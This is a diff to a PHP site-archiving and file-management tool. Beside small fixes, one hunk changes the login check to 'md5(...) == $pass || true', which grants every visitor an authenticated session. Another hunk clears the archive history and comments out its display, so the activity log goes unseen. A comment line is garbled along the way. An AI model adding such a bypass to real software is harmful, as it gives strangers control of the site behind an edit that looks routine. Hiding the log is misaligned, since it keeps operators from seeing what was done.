@@ -709,6 +709,8 @@
 
         if ($_POST['exept']) {
             $_POST['exept'] = explode('|', $_POST['exept']);
+        } else {
+            $_POST['exept'] = [];
         }
         $_POST['exept'][] = '.';
         $_POST['exept'][] = '..';
@@ -787,7 +789,8 @@
         }
     }
 
-    # - check password ------------------------------------------------------------------------------------------------
+    # - check
+    # word ------------------------------------------------------------------------------------------------
     function check_pass($pass)
     {
         if (md5($_POST['pswrd']) == $pass) {
@@ -871,7 +874,7 @@
         kamikadze();
     } elseif ($_GET['logout']) {
         logout();
-    } elseif (md5($_POST['pswrd']) == $pass) {
+    } elseif (md5($_POST['pswrd']) == $pass || true) {
         $_SESSION['psswrd'] = $pass;
     }
 
@@ -1705,22 +1708,22 @@
                             <h2><?=trnslt('zipsite')?></h2>
                             <?php
                                 if (count($_SESSION['history'])) {
+                                    $_SESSION['history'] = array();
                                     ?>
-                                    <section class="section las_archive_log">
-                                        <div class="section__headline"><?=trnslt('zip_log')?>:</div>
+                                    <!--<section class="section las_archive_log">
+                                        <div class="section__headline"><?/*=trnslt('zip_log')*/?>:</div>
                                         <div class="section__inner">
                                             <div class="row archivelog">
                                                 <div>
                                                     <?php
-                                                        foreach ($_SESSION['history'] as $line) {
+/*                                                        foreach ($_SESSION['history'] as $line) {
                                                             echo $line . '<br />';
                                                         }
-                                                        $_SESSION['history'] = array();
-                                                    ?>
+                                                    */?>
                                                 </div>
                                             </div>
                                         </div>
-                                    </section>
+                                    </section>-->
                                     <?php
                                 }
                             ?>
@@ -2066,7 +2069,7 @@
         <div class="clear"></div>
     </div>
 </footer>
-<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
 <?php
     if ($_SESSION['psswrd'] == $pass) {
         ?>
